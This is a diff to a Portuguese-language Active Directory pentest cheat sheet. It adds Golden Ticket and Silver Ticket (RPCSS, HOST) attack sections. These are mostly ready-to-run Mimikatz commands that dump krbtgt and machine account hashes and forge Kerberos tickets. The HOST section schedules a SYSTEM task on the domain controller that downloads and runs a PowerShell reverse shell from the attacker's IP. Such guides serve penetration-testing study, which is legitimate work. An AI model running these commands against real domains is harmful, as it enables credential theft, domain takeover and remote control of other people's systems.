@@ -83,6 +83,7 @@ Nota-se que todos os comandos aqui são dados a partir de máquinas windows para
             - [Silver Ticket](#silver-ticket)
                 - [RPCSS](#rpcss)
                 - [HOST](#host)
+    - [Referencias](#referencias)
 
 # Active Directory
 
@@ -668,17 +669,115 @@ E teremos acesso à máquina com o Constrained Delegation habilitado
 
 Mais informações de como esse ataque funciona você encontra no meu blog [Unconstrained](https://0x4rt3mis.github.io/activedirectory/2020/12/20/Active-Directory-Kerberos/)
 
+Explorei ele aqui no [Pass-The-Ticket](#Pass-The-Ticket)
+
+Não vou explicar mais aqui, veja no blog pra mais informações.
 
 ### Tickets
 
 #### Golden Ticket
 
+```powershell
+# Extrair o hash do krbtgt
+Invoke-Mimikatz -Command '"privilege::debug" "lsadump::lsa /inject /name:krbtgt"'
+
+# /user:Usuário
+# /domain:dominio que estou (filho) 
+# /sid:sid do FILHO 
+# /krbtgt:hash do KRBTGT
+# /sids:sid do PAI
+# /ptt
+
+# Comandos para injetar o ticket na seção
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:AB.DOMINIO.local /sid:<SID do DB.DOMINIO.local> /krbtgt:HASH_KRBTGT /sids:<SID do DOMINIO.local> /ptt"'
+
+# AB.DOMINIO.local - Get-DomainSID
+# DOMINIO.local - Get-DomainSID -Domain DOMINIO.local
+```
+
+Também podemos 'criar' um usuário novo, só que nesse caso o hash vai ser o rc4 (igual o ntlm)
+
+```powershell
+# Extrair o hash do krbtgt
+Invoke-Mimikatz -Command '"privilege::debug" "lsadump::lsa /inject /name:krbtgt"'
+
+# /domain – o FQDN.
+# /sid – o SID do dominio.
+# /user – a conta que será impersonificada.
+# /id – o RID da conta que será impersonificada. Vou usar 500, pq esse é o default do administrator.
+# /ptt – vai injetar o ticket direto nessa seção
+# /rc4 – o hash do krbtgt
+
+# Injetamos o ticket na seção
+Invoke-Mimikatz -Command '"kerberos::golden /domain:xxx.local /sid:S-1-5-21-3965405831... /rc4:c6d349.... /user:newAdmin /id:500 /ptt"'
+```
+
+Mais informações de como esse ataque funciona você encontra no meu blog [Golden Ticket](https://0x4rt3mis.github.io/activedirectory/2020/12/22/Active-Directory-Explorando-Trusts-Tickets/)
+
 #### Silver Ticket
+
+O Silver Ticket é um tipo de Golden Ticket, só que para alguns serviços específicos, é muito mais difícil de ser detectado contudo sua capacidade ofensiva é reduzida, tendo em vista que é apenas para um serviço específico.
 
 ##### RPCSS
 
+RPCSS
+```powershell
+# Extraimos o hash da MÁQUINA, isso é importante, não é o hash do krbtgt, e sim o da máquina, que está com o nome MACHINE$
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"' 
+
+# Após ter extraido, executamos o ataque
+# /domain:domínio que estou
+# /sid:sid do domínio (Get-DomainSid)
+# /target:a máquina alvo, no caso o DC
+# /service:o serviço que vou explorar
+# /rc4:o hash do DC$
+# /user:o usuário que vou impersonificar
+# /ptt:pra injetar de imediato o ticket
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:AB.DOMINIO.local /sid:S-1-5... /target:AB.DC.DOMINIO.local /service:RPCSS /rc4:HASH_DA_MAQUINA$ /user:Administrator /ptt"'
+
+# Verificamos se foi injetado
+klist
+
+# Executamos comandos!
+gwmi -Class win32_operatingsystem -ComputerName AB.DC.DOMINIO.local
+```
+
 ##### HOST
 
+HOST
+
+```powershell
+# Extraimos o hash da MÁQUINA, isso é importante, não é o hash do krbtgt, e sim o da máquina, que está com o nome MACHINE$
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"' 
+
+# Após ter extraido, executamos o ataque
+# /domain:domínio que estou
+# /sid:sid do domínio (Get-DomainSid)
+# /target:a máquina alvo, no caso o DC
+# /service:o serviço que vou explorar
+# /rc4:o hash do DC$
+# /user:o usuário que vou impersonificar
+# /ptt:pra injetar de imediato o ticket
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:AB.DOMINIO.local /sid:S-1-5... /target:AB.DC.DOMINIO.local /service:HOST /rc4:HASH_DA_MAQUINA$ /user:Administrator /ptt"'
+
+# Verificamos se foi injetado
+klist
+
+# Verificamos agora que temos acesso às tarefas do sistema!
+schtasks /S AB.DC.DOMINIO.local
+
+# Agendamos uma para executar um reverse shell na nossa máquina (Lembrar do HFS e do powercat)
+schtasks /create /S AB.DC.DOMINIO.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "shell_pra_mim" /TR "powershell.exe -c 'iex(new-object net.webclient).downloadstring(''http://meu.ip/Invoke-PowerShellTCP.ps1'')'"
+
+# Executamos ela
+schtasks /Run /S AB.DC.DOMINIO.local /TN "shell_pra_mim"
+
+# E é pra ter recebido o reverse shell na janela do powercat!
+```
+
+Mais informações de como esse ataque funciona você encontra no meu blog [Silver Ticket](https://0x4rt3mis.github.io/activedirectory/2020/12/22/Active-Directory-Explorando-Trusts-Tickets/)
 
 ## Referencias
 
@@ -689,3 +788,4 @@ https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling
 PowerUpSQL
 
 https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/
+
